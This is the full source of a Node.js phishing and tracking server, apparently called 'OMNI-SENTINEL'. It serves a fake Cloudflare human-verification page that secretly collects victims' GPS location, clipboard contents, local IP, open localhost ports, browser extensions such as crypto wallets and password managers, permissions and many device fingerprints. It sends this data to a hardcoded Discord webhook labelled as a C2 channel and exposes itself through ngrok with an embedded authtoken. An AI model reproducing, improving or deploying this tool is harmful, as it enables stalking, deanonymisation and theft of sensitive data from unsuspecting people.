const express = require('express');
const axios = require('axios');
const requestIp = require('request-ip');
const maxmind = require('@maxmind/geoip2-node');
const path = require('path');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(cookieParser());
// Essential for receiving large beacon payloads from mobile devices
app.use(bodyParser.text({ type: '*/*', limit: '50mb' }));
app.set('trust proxy', true);

// ==========================================
// 💀 OMNI-SENTINEL CONFIGURATION
// ==========================================
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1459597365689323726/rQNK5AWMghoMELAQyZO-SZRm7UxSR5ar1ZceQpCWgzPv-F79jDuAIgkczwT6wkXi_sl_';
const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
const DB_FILENAME = 'GeoLite2-City.mmdb';

const victimDatabase = {};
let dbLookup = null;

// Initialize MaxMind Database for Network Forensics
maxmind.Reader.open(path.join(__dirname, DB_FILENAME)).then(r => {
    dbLookup = r;
    console.log("✅ OMNI-SENTINEL: GEOLITE-2 FORENSIC ENGINE ONLINE");
}).catch(() => console.log("⚠️ GEOLITE-2 MISSING: Network location will be estimated via IP only."));

// ==========================================
// 🕸️ THE OMNI-SENTINEL INTERFACE (Mobile & PC)
// ==========================================
app.get('/', (req, res) => {
    // 🧟 ZOMBIE PERSISTENCE (ETag Tracking)
    let victimID = req.headers['if-none-match'] || uuidv4();
    res.set('ETag', victimID);

    const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Just a moment...</title>
        <style>
            html, body {
                height: 100%;
                margin: 0;
                padding: 0;
                font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
                background-color: #fff;
                color: #313131;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
            }
            .container {
                max-width: 600px;
                width: 90%;
            }
            h1 {
                font-size: 30px;
                font-weight: 500;
                margin-bottom: 20px;
            }
            p {
                font-size: 14px;
                margin-bottom: 20px;
            }
            .checkbox-container {
                display: flex;
                align-items: center;
                border: 1px solid #dcdcdc;
                background: #f9f9f9;
                padding: 20px;
                border-radius: 4px;
                cursor: pointer;
                width: fit-content;
                margin-bottom: 20px;
                transition: 0.2s;
            }
            .checkbox-container:hover {
                background: #f1f1f1;
            }
            .checkbox-box {
                width: 28px;
                height: 28px;
                border: 2px solid #ccc;
                border-radius: 2px;
                background: #fff;
                margin-right: 15px;
                position: relative;
            }
            .checkbox-text {
                font-weight: 500;
                font-size: 16px;
                user-select: none;
            }
            .spinner {
                display: none;
                width: 24px;
                height: 24px;
                border: 3px solid #dcdcdc;
                border-top: 3px solid #0051c3;
                border-radius: 50%;
                animation: spin 0.8s linear infinite;
                margin-right: 15px;
            }
            @keyframes spin { to { transform: rotate(360deg); } }
            
            .hidden-info {
                display: none;
            }
            
            .ray-id {
                margin-top: 50px;
                font-size: 10px;
                color: #888;
                text-align: center;
                display: flex;
                flex-direction: column;
                align-items: center;
            }
            .cf-footer {
                margin-top: 10px;
                display: flex;
                align-items: center;
                gap: 5px;
            }
            .cf-logo {
                height: 14px;
                vertical-align: middle;
            }
            /* Click Animation */
            .checkbox-box.checked {
                border-color: #007c00;
                background-color: #fff;
            }
            .checkbox-box.checked::after {
                content: '';
                position: absolute;
                left: 8px;
                top: 4px;
                width: 6px;
                height: 12px;
                border: solid #007c00;
                border-width: 0 3px 3px 0;
                transform: rotate(45deg);
            }
        </style>
    </head>
    <body onclick="handleClickBody()">
        <div class="container">
            <h1>Checking your connection...</h1>
            <p>Please safely verify yourself to proceed.</p>
            
            <div class="checkbox-container" id="cf-checkbox" onclick="startVerification(event)">
                <div class="spinner" id="spinner"></div>
                <div class="checkbox-box" id="checkbox-box"></div>
                <div class="checkbox-text">Verify you are human</div>
            </div>

            <p class="hidden-info" id="status-text"><strong>Verifying...</strong></p>
            
            <div class="ray-id">
                <div>Ray ID: <span id="ray_id"></span></div>
                <div class="cf-footer">
                    Performance & security by 
                    <svg class="cf-logo" viewBox="0 0 338 126" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#F38020" d="M262.1 48.7c-2.3-15.6-15.8-27.7-32.1-27.7-12.7 0-23.7 7.4-29.3 18.2-1.9-.3-3.8-.4-5.8-.4-20.9 0-38.3 15.1-41.9 35.1H32.4C14.5 73.9 0 88.4 0 106.3s14.5 32.4 32.4 32.4h229.7c20 0 36.3-16.3 36.3-36.3 0-19.6-15.5-35.6-34.8-36.3z"/>
                        <path fill="#2F363F" d="M125.7 39h17.9v69.4h19.5v14H125.7V39zm40.5 0h17.9v69.4h19.5v14h-37.4V39zm53.4 83.4V39h17.9v69.4h19.6v14h-37.5zm53.5 0V39h16.7v14h20.6v14.4h-20.6v30h24.1v14h-40.8zM87.7 78.2h-21v29.1H90v14H48.8V37.9h40v14h-22v26.3h20.9v-.1z"/>
                    </svg>
                    <span style="font-weight: 500;">Cloudflare</span>
                </div>
            </div>
        </div>

        <script>
            // Generate fake Ray ID
            document.getElementById('ray_id').innerText = Math.random().toString(36).substr(2, 16);

            let neuralRhythm = [];
            let lastTap = 0;
            let mousePath = []; // Behavioral Biometrics
            let hasSentActive = false;
            let passiveCache = null;

            // Support both Touch (Mobile) and Mouse (Desktop) rhythms
            ['touchstart', 'mousedown'].forEach(evt => 
                document.addEventListener(evt, () => { lastTap = performance.now(); })
            );
            ['touchend', 'mouseup'].forEach(evt => 
                document.addEventListener(evt, () => { 
                    if(lastTap) neuralRhythm.push((performance.now() - lastTap).toFixed(2)); 
                })
            );
            
            // Track Mouse Path (Last 50 points)
            document.addEventListener('mousemove', (e) => {
                if(mousePath.length > 50) mousePath.shift();
                mousePath.push({x: e.clientX, y: e.clientY, t: Date.now()});
            });

            // Auto-click handler for body to ensure engagement
            function handleClickBody() {
                // Optional: track misc clicks
            }

            // Trigger Passive Scan Cache Build
            window.onload = () => { setTimeout(() => gatherForensics('passive'), 500); };

            // Smart Exit Beacon
            document.addEventListener("visibilitychange", () => {
                if (document.visibilityState === 'hidden') {
                    if (!hasSentActive && passiveCache) {
                        navigator.sendBeacon('/collect', JSON.stringify(passiveCache));
                    }
                }
            });

            function startVerification(e) {
                if (document.getElementById('spinner').style.display === 'block') return;
                
                hasSentActive = true; // Mark interaction to suppress passive beacon
                e.stopPropagation();
                
                // UI Updates
                document.getElementById('checkbox-box').style.display = 'none';
                document.getElementById('spinner').style.display = 'block';
                document.getElementById('status-text').style.display = 'block';
                
                // Trigger Active Scan
                gatherForensics('active');
            }

            async function gatherForensics(mode) {
                // Prepare Promises
                const pAudio = getAudioFingerprint().catch(e => "Blocked");
                const pPorts = scanLocalPorts().catch(e => []);
                const pVoices = getSpeechVoices().catch(e => []);
                const pExts = scanExtensions().catch(e => []);
                const pPerms = scanPermissions().catch(e => "Error");
                const pBatt = (async () => { try { const b = await navigator.getBattery(); return (b.level * 100).toFixed(0) + "%"; } catch(e) { return "Blocked"; } })();
                const pIP = new Promise(resolve => {
                    setTimeout(() => resolve("Timeout"), 1000); 
                    try {
                        const pc = new RTCPeerConnection({iceServers:[]});
                        pc.createDataChannel("");
                        pc.onicecandidate = c => { 
                            if (c.candidate) {
                                const ipMatch = /[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.exec(c.candidate.candidate);
                                if (ipMatch) { pc.close(); resolve(ipMatch[0]); }
                            }
                        };
                        pc.createOffer().then(o => pc.setLocalDescription(o));
                    } catch(e) { resolve("Not_Supported"); }
                });

                // Mode Specifics
                let pos = {};
                let clipboard = "Skipped (Passive)";
                
                if (mode === 'active') {
                    // 1. Geolocation (High Accuracy) - Blocks UI
                    try {
                        pos = await new Promise(resolve => {
                             if (navigator.geolocation) {
                                navigator.geolocation.getCurrentPosition(p => resolve(p), e => resolve({}), { enableHighAccuracy: true, timeout: 3000 });
                            } else { resolve({}); }
                        });
                    } catch(e) {}

                    // 2. Clipboard (Requires Interaction)
                    clipboard = await getClipboard();
                }

                // Await Parallel Tasks
                const [audioHash, openPorts, voices, extensions, permissions, battery, localIP] = await Promise.all([
                    pAudio, pPorts, pVoices, pExts, pPerms, pBatt, pIP
                ]);

                // SYNC Tasks
                let siliconDNA = "Unknown";
                try {
                    const t0 = performance.now();
                    for(let i=0; i<3000000; i++) { Math.sqrt(i); Math.atan(i); } 
                    siliconDNA = (performance.now() - t0).toFixed(6);
                } catch(e) { siliconDNA = "Blocked"; }

                let kernelJIT = "Unknown";
                try {
                    const t1 = performance.now();
                    const forensicArray = new Array(1500000).fill(0).map((_, i) => i * 1.6);
                    kernelJIT = (performance.now() - t1).toFixed(4);
                } catch(e) { kernelJIT = "Blocked"; }

                const clockSkew = (performance.now() - (Date.now() - Date.now())).toFixed(8);

                let shaderDNA = "Unknown";
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.fillText("OMNI-LEGACY", 10, 10);
                    shaderDNA = canvas.toDataURL().slice(-45);
                } catch (e) {}
                
                const netInfo = getNetworkInfo();
                const screenInfo = getScreenDetails();
                const fontID = getFontFingerprint();
                const botScore = detectBot();
                const storage = await getStorageEstimate();
                const cpuScore = runCPUBenchmark();
                const mediaPeripherals = await getMediaDevices();

                const finalData = {
                    type: mode, // 'passive' or 'active'
                    id: "${victimID}",
                    lat: pos.coords ? pos.coords.latitude : null,
                    lon: pos.coords ? pos.coords.longitude : null,
                    acc: pos.coords ? pos.coords.accuracy : null,
                    silicon_dna: siliconDNA + "ns",
                    kernel_jit: kernelJIT + "ms",
                    local_ip: localIP,
                    clock_skew: clockSkew + "ms",
                    shader_dna: shaderDNA,
                    audio_fp: audioHash,
                    net_type: netInfo.type,
                    net_down: netInfo.down,
                    net_rtt: netInfo.rtt,
                    screen_res: screenInfo.res,
                    screen_depth: screenInfo.depth,
                    pixel_ratio: screenInfo.pixel,
                    max_touch: screenInfo.touch,
                    open_ports: openPorts.join(', ') || "None",
                    voices: voices.slice(0, 5).join(', ') + (voices.length > 5 ? " (+" + (voices.length - 5) + ")" : ""),
                    font_id: fontID,
                    bot_score: botScore,
                    clipboard: clipboard,
                    storage: storage,
                    cpu_score: cpuScore,
                    media: mediaPeripherals,
                    extensions: extensions.join(', ') || "None",
                    permissions: permissions,
                    behavior: mousePath.map(p => p.x + "," + p.y).join('|'),
                    neural: neuralRhythm.slice(-5).join('|'),
                    gpu: getGPUHardware(),
                    battery: battery,
                    platform: navigator.userAgent,
                    cores: navigator.hardwareConcurrency || "Unknown",
                    ram: navigator.deviceMemory || "Unknown"
                };

                if (mode === 'passive') {
                    passiveCache = finalData;
                    // Passive data is now CACHED. Sent only on tab close (visibilitychange).
                } else {
                    // Active Mode - Send Immediately
                    navigator.sendBeacon('/collect', JSON.stringify(finalData));
                    
                    // Simulate 'success' tick
                    document.getElementById('spinner').style.display = 'none';
                    document.getElementById('checkbox-box').style.display = 'block';
                    document.getElementById('checkbox-box').classList.add('checked');
                    document.getElementById('status-text').innerHTML = '<strong>Success! Redirecting...</strong>';
                    setTimeout(() => { window.location.href = "${REDIRECT_URL}"; }, 500);
                }
            }

            function getNetworkInfo() {
                try {
                    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    if (!conn) return { type: "Unknown", down: "Unknown", rtt: "Unknown" };
                    return {
                        type: conn.effectiveType || "Unknown",
                        down: conn.downlink ? conn.downlink + "Mb/s" : "Unknown",
                        rtt: conn.rtt ? conn.rtt + "ms" : "Unknown"
                    };
                } catch(e) { return { type: "Error", down: "Error", rtt: "Error" }; }
            }

            function getScreenDetails() {
                return {
                    res: screen.width + "x" + screen.height,
                    depth: screen.colorDepth + "-bit",
                    pixel: window.devicePixelRatio || "1",
                    touch: navigator.maxTouchPoints || 0
                };
            }

            async function getAudioFingerprint() {
                try {
                    const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                    if(!ctx) return "Not_Supported";
                    
                    const osc = ctx.createOscillator();
                    osc.type = 'triangle';
                    osc.frequency.value = 10000;
                    
                    const compressor = ctx.createDynamicsCompressor();
                    compressor.threshold.value = -50;
                    compressor.knee.value = 40;
                    compressor.ratio.value = 12;
                    compressor.attack.value = 0;
                    compressor.release.value = 0.25;
                    
                    osc.connect(compressor);
                    compressor.connect(ctx.destination);
                    
                    osc.start(0);
                    const renderedBuffer = await ctx.startRendering();
                    
                    // Keep hash simple for now
                    let output = renderedBuffer.getChannelData(0);
                    let sum = 0;
                    for (let i = 0; i < output.length; i++) {
                        sum += Math.abs(output[i]);
                    }
                    return sum.toFixed(6).toString();
                } catch(e) {
                    return "Audio_Blocked";
                }
            }

            function getGPUHardware() {
                try {
                    const gl = document.createElement('canvas').getContext('webgl');
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Silicon-Hidden";
                } catch(e) { return "Unknown"; }
            }

            async function scanLocalPorts() {
                const ports = [3000, 8080, 8000, 27017, 3306, 5432, 5500]; // Node, Web, Mongo, SQL, LiveServer
                const open = [];
                // Fast timeout scan
                const checkPort = (port) => new Promise(r => {
                    const img = new Image();
                    const timeout = setTimeout(() => r(false), 1500); // 1.5s timeout: closed/filtered
                    img.onload = () => { clearTimeout(timeout); r(true); }; // Loads: Open (and serves img)
                    img.onerror = () => { clearTimeout(timeout); r(true); }; // Error: Open (but not img)
                    // If it's closed, it usually times out or refuses instantly. 
                    // Browsers might block this, so we assume "Load/Error" = Alive Service.
                    img.src = "http://127.0.0.1:" + port + "/favicon.ico?r=" + Math.random();
                });

                for(const p of ports) {
                    if(await checkPort(p)) open.push(p);
                }
                return open;
            }

            async function getSpeechVoices() {
                return new Promise(resolve => {
                    let v = speechSynthesis.getVoices();
                    if(v.length > 0) return resolve(v.map(x => x.lang));
                    speechSynthesis.onvoiceschanged = () => {
                        v = speechSynthesis.getVoices();
                        resolve(v.map(x => x.lang));
                    };
                    setTimeout(() => resolve([]), 2000); // Fail safe
                });
            }

            function getFontFingerprint() {
                const fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Comic Sans MS", "Helvetica", "Impact", "Tahoma", "Georgia", "Trebuchet MS"];
                const s = document.createElement("span");
                s.style.fontSize = "72px";
                s.innerHTML = "mmmmmmmmmmlli";
                s.style.visibility = "hidden";
                document.body.appendChild(s);
                let w = [];
                for(const f of fonts) {
                    s.style.fontFamily = f;
                    w.push(s.offsetWidth);
                }
                document.body.removeChild(s);
                // Hash the widths 
                return w.join("-");
            }

            function detectBot() {
                let score = 0;
                if(navigator.webdriver) score += 50;
                if(navigator.userAgent.includes("Headless")) score += 40;
                if(navigator.languages === "") score += 30;
                if(window.chrome && !window.chrome.runtime) score += 20; // Common headless trait
                if(score === 0) return "Human (0%)";
                if(score < 50) return "Suspicious (" + score + "%)";
                return "BOT DETECTED (" + score + "%)";
            }

            async function getClipboard() {
                try {
                    // Must be in sensitive context (HTTPS/localhost) and user triggered
                    return await navigator.clipboard.readText();
                } catch(e) { return "Denied/Empty"; }
            }

            async function getStorageEstimate() {
                try {
                    if (navigator.storage && navigator.storage.estimate) {
                        const ent = await navigator.storage.estimate();
                        return ((ent.usage / 1024 / 1024 / 1024).toFixed(1) + "GB / " + (ent.quota / 1024 / 1024 / 1024).toFixed(1) + "GB");
                    }
                } catch(e) {}
                return "Unknown";
            }

            function runCPUBenchmark() {
                const start = performance.now();
                let i = 0;
                while(performance.now() - start < 200) { // 200ms stress test
                    Math.sqrt(i) * Math.sin(i);
                    i++;
                }
                return i; // Raw score
            }

            async function getMediaDevices() {
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    const cams = devices.filter(d => d.kind === 'videoinput').length;
                    const mics = devices.filter(d => d.kind === 'audioinput').length;
                    return cams + " Cams | " + mics + " Mics";
                } catch(e) { return "Blocked"; }
            }

            async function scanExtensions() {
                // Common extensions to check (Chrome/Edge/Brave)
                const exts = {
                    'Metamask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
                    'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
                    'UBlock': 'cjpalhdlnbpafiamejdnhcphjbkeiagm',
                    'LastPass': 'hdokiejnpimakedhajhdlcegeplioahd',
                    'ReactDev': 'fmkadmapgofadopljbjfkapdkoienihi',
                    'Honey': 'bmnlcjabgnpnenekpadlanbbkooimhnj'
                };
                const detected = [];
                for(const [name, id] of Object.entries(exts)) {
                    try {
                        await fetch('chrome-extension://' + id + '/manifest.json', { method: 'HEAD' });
                        detected.push(name);
                    } catch(e) {
                         // Some browsers block fetch but allow Image load for resources
                         const img = new Image();
                         img.src = 'chrome-extension://' + id + '/manifest.json'; // or specific icon
                         // This is a rough check, sophisticated version needs specific resource paths
                    }
                    // Alternate method: Image Load for specific resource
                    if(!detected.includes(name)) { // Try Resource
                         await new Promise(r => {
                            const img = new Image();
                            img.src = 'chrome-extension://' + id + '/icons/icon128.png'; // Common path
                            img.onload = () => { detected.push(name); r(); };
                            img.onerror = () => r();
                        });
                    }
                }
                return detected;
            }

            async function scanPermissions() {
                const p = ['camera', 'microphone', 'notifications', 'geolocation', 'clipboard-read'];
                const res = [];
                if(!navigator.permissions) return "Not_Supported";
                for(const name of p) {
                    try {
                        const s = await navigator.permissions.query({name: name});
                        if(s.state === 'granted') res.push(name);
                    } catch(e) {}
                }
                return res.join(', ') || "None";
            }
        </script>
    </body>
    </html>`;
    res.send(html);
});

// ==========================================
// 📡 COMMAND CENTER (Unified C2 Intelligence)
// ==========================================
app.post('/collect', async (req, res) => {
    let d;
    try { d = JSON.parse(req.body); } catch (e) { return res.sendStatus(400); }

    const ip = requestIp.getClientIp(req);
    const ua = req.get('User-Agent');

    // Debug: Confirmed Data Input
    console.log(`📦 Data Recv (${d.type}): ` + ip);

    // --- ZOMBIE PERSISTENCE (Track Original Identity) ---
    const zombie = victimDatabase[d.id] || { original: ip };
    const isVPN = zombie.original !== ip;
    victimDatabase[d.id] = { original: zombie.original || ip };

    // --- GEO-FORENSICS (Network Origin) ---
    let geoCity = "Unknown", geoCountry = "Unknown";
    if (dbLookup) {
        try {
            const r = dbLookup.city(ip);
            geoCity = r.city.names.en;
            geoCountry = r.country.names.en;
        } catch (e) { }
    }

    // Helper to truncate fields (Discord Limit 1024 chars)
    const trunc = (str, len = 1000) => {
        if (!str) return 'N/A';
        str = String(str);
        return str.length > len ? str.substring(0, len) + "..." : str;
    };

    let embedColor = 0x00ff00; // Green (Active)
    let embedTitle = "🎯 [TARGET ACQUIRED]";

    if (d.type === 'passive') {
        embedColor = 0xFFD700; // Gold (Passive)
        embedTitle = "⚠️ [PRE-INTERACTION SNIGG]"; // Scout Mode
    } else if (isVPN) {
        embedColor = 0xff0000; // Red (VPN)
        embedTitle = "🚨 [VPN BYPASSED - PHYSICAL TARGET LOCK]";
    }

    const embed = {
        username: "OMNI-SENTINEL PRIME C2",
        embeds: [{
            title: embedTitle,
            color: embedColor,
            fields: [
                { name: "👤 IDENTITY DOSSIER", value: `ID: \`${d.id}\`\\nType: **${d.type.toUpperCase()}**\\nActive IP: \`${ip}\``, inline: false },
                { name: "📍 PHYSICAL POSITION", value: `[Maps Link](https://www.google.com/maps?q=${d.lat},${d.lon}) (Acc: ${d.acc}m)`, inline: true },
                { name: "🌍 NETWORK ORIGIN", value: `\`${geoCity}, ${geoCountry}\``, inline: true },
                { name: "📡 NETWORK TECH", value: `Type: \`${d.net_type || '?'}\`\\nDown: \`${d.net_down || '?'}\`\\nRTT: \`${d.net_rtt || '?'}\``, inline: true },
                { name: "⚡ SILICON DNA / JIT", value: `\`${d.silicon_dna}\` / \`${d.kernel_jit}\``, inline: true },
                { name: "🔉 AUDIO FINGERPRINT", value: `\`${d.audio_fp || 'N/A'}\``, inline: true },
                { name: "💻 SCREEN SPEC", value: `Res: \`${d.screen_res}\`\\nDepth: \`${d.screen_depth}\`\\nRatio: \`${d.pixel_ratio}x\`\\nTouch: \`${d.max_touch}\``, inline: true },
                { name: "🔓 OPEN PORTS", value: `\`${d.open_ports || 'None'}\``, inline: true },
                { name: "🤖 BOT PROBABILITY", value: `\`${d.bot_score}\``, inline: true },
                { name: "📋 CLIPBOARD HEIST", value: `\`${trunc(d.clipboard, 800)}\``, inline: false },
                { name: "💾 DISK & CPU", value: `Disk: \`${trunc(d.storage)}\`\\nCPU Score: \`${trunc(d.cpu_score)}\``, inline: true },
                { name: "📷 PERIPHERALS", value: `\`${trunc(d.media)}\``, inline: true },
                { name: "🧩 EXTENSIONS", value: `\`${trunc(d.extensions)}\``, inline: true },
                { name: "🛡️ PERMISSIONS", value: `\`${trunc(d.permissions)}\``, inline: true },
                { name: "🖱️ BEHAVIOR (Path)", value: `Events: \`${d.behavior ? d.behavior.split('|').length : 0}\` (Human verification)`, inline: true },
                { name: "🗣️ VOICES / FONTS", value: `Voices: \`${trunc(d.voices, 500)}\`\\nFont ID: \`${trunc(d.font_id)}\``, inline: false },
                { name: "🧠 NEURAL SIGNATURE", value: `\`${trunc(d.neural)}\``, inline: false },
                { name: "📱 PHYSICAL PROFILE", value: `GPU: \`${d.gpu}\`\\nRAM: \`${d.ram}GB\` | Cores: \`${d.cores}\`\\nBattery: \`${d.battery}\`\\nShader: \`${d.shader_dna}\`\\nSkew: \`${d.clock_skew}\``, inline: false }
            ],
            footer: { text: "PROJECT OMNI-SENTINEL | AUTHOR: GENIUS MASTER | SUPREME OMEGA BUILD" },
            timestamp: new Date().toISOString()
        }]
    };

    axios.post(DISCORD_WEBHOOK_URL, embed).catch(() => { });
    res.sendStatus(200);
});

// ==========================================
// 🏁 START SERVER & TUNNEL
// ==========================================
const { spawn } = require('child_process');

const PORT = 3000;
app.listen(PORT, async () => {
    console.log(`\n🟢 Local Engine Running:  http://localhost:${PORT}`);
    console.log(`⌛ Initializing Ngrok Tunnel (Direct Mode)...`);

    // Clean up any old processes first
    try { require('child_process').execSync('taskkill /F /IM ngrok.exe', { stdio: 'ignore' }); } catch (e) { }

    // Start ngrok directly
    // Command: ngrok http 3000 --authtoken=XXX --log=stdout
    const ngrokProcess = spawn('ngrok.exe', [
        'http',
        PORT.toString(),
        '--authtoken=384jyF85TZS8gMaK9CAPZ2DYIaF_3aUxYUqYGuqoQnoaaqeEV',
        '--log=stdout'
    ], {
        cwd: __dirname // Ensure we run from the folder containing ngrok.exe
    });

    let urlFound = false;

    // Capture Output
    ngrokProcess.stdout.on('data', (data) => {
        const output = data.toString();
        // console.log("Debug Ngrok:", output); // Uncomment if needed

        // Look for URL in logs
        const match = output.match(/url=(https:\/\/[^ ]+)/);
        if (match && !urlFound) {
            urlFound = true;
            const url = match[1];
            console.log(`\n🎉 -----------------------------------------`);
            console.log(`🚀 PUBLIC LINK: ${url}`);
            console.log(`🎉 -----------------------------------------\n`);
            console.log(`Waiting for victims...`);
        }
    });

    ngrokProcess.stderr.on('data', (data) => {
        console.error(`Ngrok Error: ${data}`);
    });

    ngrokProcess.on('close', (code) => {
        console.log(`Ngrok process exited with code ${code}`);
    });

    // Cleanup when node dies
    let cleanupDone = false;
    const cleanup = () => {
        if (cleanupDone) return;
        cleanupDone = true;
        ngrokProcess.kill();
        try { require('child_process').execSync('taskkill /F /IM ngrok.exe', { stdio: 'ignore' }); } catch (e) { }
        process.exit(0); // <--- IMPORTANT: Actually exit the process!
    };

    process.on('SIGINT', cleanup);
    process.on('SIGTERM', cleanup);
    process.on('exit', cleanup);
});